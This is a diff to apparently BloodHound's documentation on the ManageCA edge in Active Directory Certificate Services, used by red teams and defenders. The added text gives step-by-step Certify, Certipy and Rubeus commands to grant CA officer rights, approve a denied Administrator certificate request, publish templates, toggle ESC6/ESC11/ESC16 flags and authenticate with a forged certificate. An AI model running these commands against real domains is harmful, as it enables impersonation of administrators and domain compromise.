@@ -5,26 +5,140 @@ description: The principal has the "Manage CA", also known as "CA Administrator"
 
 <img noZoom src="/assets/enterprise-AND-community-edition-pill-tag.svg" alt="Applies to BloodHound Enterprise and CE"/>
 
-This permission allows the principal to configure the CA to allow subject alternate names, publish certificate templates, grant "Manage Certificates" and more.
+This permission allows the principal to configure the CA to allow subject alternate names, publish certificate templates, grant "Manage Certificates", grant enrollment rights, change certain CA flags, and more.
 
-Abuse Info
------------
+CA Administrators can perform the following actions that may enable an ADCS escalation:
 
-This relationship alone is not enough to perform a privilege escalation or impersonation primitive. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge.
+1. Grant CA Officer (ManageCertificates) and approve a denied certificate request
+2. Publish a certificate template (e.g. one that enables an ESC1 condition)
+3. Grant Enroll on the enterprise CA
+4. Enable the ESC6 CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2`
+5. Disable the ESC11 enforcement flag `IF_ENFORCEENCRYPTICERTREQUEST` (weakens RPC enrollment security; enables relay)
+6. Disable the security extension on the enterprise CA (ESC16)
+7. Abuse a CRL Distribution Point (CDP) to coerce and relay the CA server
+8. Abuse a CDP to obtain RCE on the CA server (e.g., via web shell)
 
-Opsec Considerations
---------------------
+## Abuse Info
 
-When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate.
+This relationship alone is not automatically a privilege escalation; however, it frequently enables one of several ADCS escalation paths when combined with template / CA configuration weaknesses.
 
-References
-----------
+
+### 1. Grant CA Officer and Approve a Denied Request
+
+Role separation (when enabled) prevents a single principal from holding both ManageCA and ManageCertificates, but this configuration is rare.
+
+**Windows**
+
+Grant the CA Officer (ManageCertificates) role with Certify (v2.0):
+```cmd
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --officer S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-12345
+```
+Request an ESC1 (or other high-value) certificate you don't have enrollment rights for:
+```cmd
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template CustomUser --upn Administrator --sid S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-500
+```
+Approve the denied certificate request by ID:
+```cmd
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --issue-id 1337
+```
+Download the certificate (captures private key in Base64 PFX):
+```cmd
+Certify.exe request-download --ca ca01.corp.local\CORP-CA01-CA --id 1337 --private-key <Base64PrivateKey>
+```
+Authenticate using the certificate (example with Rubeus):
+```cmd
+Rubeus.exe asktgt /user:Administrator /certificate:<Base64PFX> /ptt
+```
+
+**Linux**
+Grant CA Officer (ManageCertificates) role:
+```bash
+certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password 'Passw0rd'
+```
+Issue (approve) a previously denied request:
+```bash
+certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password 'Passw0rd'
+```
+Retrieve the certificate:
+```bash
+certipy req -username john@corp.local -password 'Passw0rd' -ca corp-DC-CA -target ca.corp.local -retrieve 785
+```
+
+### 2. Publish a Certificate Template
+
+**Windows**
+
+Publish/unpublish a template (e.g. enabling ESC1):
+```cmd
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --template MyTemplate
+```
+
+**Linux**
+
+Publish a template:
+```bash
+certipy ca -ca 'corp-DC-CA' -enable-template TemplateCN -username john@corp.local -password 'Passw0rd'
+```
+
+See the ADCS ESC1 abuse documentation for subsequent exploitation steps: [ADCSESC1](/resources/edges/adcs-esc1)
+
+### 3. Grant Enroll on Enterprise CA
+
+**Windows**
+
+Grant or revoke CA enrollment rights (required for certificate issuance):
+
+```cmd
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --enroll S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-12345
+```
+
+### 4. Enable ESC6 Flag `EDITF_ATTRIBUTESUBJECTALTNAME2`
+**Windows**
+
+Toggle the flag:
+```cmd
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --esc6
+```
+Restart of the CA service (requires local admin) is needed for the change to apply.
+See the ADCS ESC6 abuse documentation for subsequent exploitation steps: [ADCSESC6a](/resources/edges/adcs-esc6a)
+
+### 5. Disable ESC11 Flag `IF_ENFORCEENCRYPTICERTREQUEST`
+**Windows**
+
+Toggle the flag:
+```cmd
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --esc11-req
+```
+Restart of the CA service required.
+
+### 6. Disable Security Extension (ESC16)
+**Windows**
+
+Set CA settings for ESC16:
+```cmd
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --esc16
+```
+Restart of the CA service required.
+
+### 7 & 8. Abuse CDP for Coercion / RCE
+
+Techniques to coerce & relay or achieve RCE via CDP manipulation are described here: [AD CS: from ManageCA to RCE](https://www.tarlogic.com/blog/ad-cs-manageca-rce/)
+
+
+## Opsec Considerations
+
+Abusing these capabilities commonly results in certificate issuance; issued certificates (and sometimes pending requests) leave artifacts on the CA host. Enabling/disabling flags or publishing templates may generate observable administrative events and typically requires a CA service restart for certain changes (ESC6, ESC11, ESC16) to take effect.
+
+## References
 
 This edge is related to the following MITRE ATT&CK tactic and techniques:
 
-* https://attack.mitre.org/techniques/T1649/
+* [T1649: Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)
 
 ### Abuse and Opsec references
 
-* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+* [Certify wiki - Escalation Techniques - ManageCA](https://github.com/GhostPack/Certify/wiki/4-%E2%80%90-Escalation-Techniques#manageca)
+* [ESC7: Dangerous Permissions on CA (Certipy wiki)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca)
+* [AD CS: from ManageCA to RCE](https://www.tarlogic.com/blog/ad-cs-manageca-rce/)
 
